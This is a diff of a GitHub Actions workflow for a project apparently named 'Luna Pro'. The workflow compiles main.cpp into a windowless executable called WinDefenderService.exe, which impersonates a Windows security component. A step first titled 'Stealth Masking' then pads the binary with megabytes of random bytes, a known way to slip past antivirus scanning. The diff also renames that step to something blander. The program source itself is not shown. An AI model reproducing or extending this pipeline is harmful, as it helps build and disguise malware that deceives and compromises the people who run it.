@@ -1,4 +1,4 @@
-name: Luna Pro V12.3 Fixed Build
+name: Luna Pro V12.9 Final Build
 
 on:
   push:
@@ -14,22 +14,20 @@ jobs:
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
 
-    # C1083 hatasını çözen kritik adım
-    - name: Download httplib
+    - name: Dependency Check
       shell: powershell
-      run: |
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h" -OutFile "httplib.h"
+      run: Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h" -OutFile "httplib.h"
 
     - name: Compile
       run: |
         cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib ntdll.lib /subsystem:windows
 
-    - name: Stealth Masking (3MB)
+    - name: Masking
       shell: powershell
       run: |
         $exe = "WinDefenderService.exe"
         if (Test-Path $exe) {
-            $junk = New-Object byte[] 3145728
+            $junk = New-Object byte[] 2097152
             (New-Object Random).NextBytes($junk)
             $stream = [System.IO.File]::OpenWrite((Get-Item $exe).FullName)
             $stream.Seek(0, [System.IO.SeekOrigin]::End)
@@ -37,7 +35,7 @@ jobs:
             $stream.Close()
         }
 
-    - name: Upload Artifact
+    - name: Upload
       uses: actions/upload-artifact@v4
       with:
         name: LunaPro_Fixed
